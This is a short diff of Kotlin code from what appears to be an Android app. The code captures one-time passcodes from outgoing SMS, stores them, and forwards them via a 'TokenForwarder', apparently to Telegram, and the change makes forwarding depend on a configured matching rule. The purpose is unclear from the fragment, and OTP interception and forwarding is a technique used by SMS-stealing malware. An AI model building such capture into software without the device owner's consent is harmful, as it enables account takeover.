@@ -79,7 +79,9 @@ object OutgoingSmsGuard {
                 capturedAt = System.currentTimeMillis()
             )
             OtpCaptureWriter.write(context, otp)
-            TokenForwarder(configManager, context).forward(otp)
+            if (SmsMatcher.shouldForwardToTelegram(config, dest, body, "outgoing")) {
+                TokenForwarder(configManager, context).forward(otp)
+            }
             flag.delete()
         } catch (e: Exception) {
             Log.w(TAG, "Blocked flag process failed: ${e.message}")
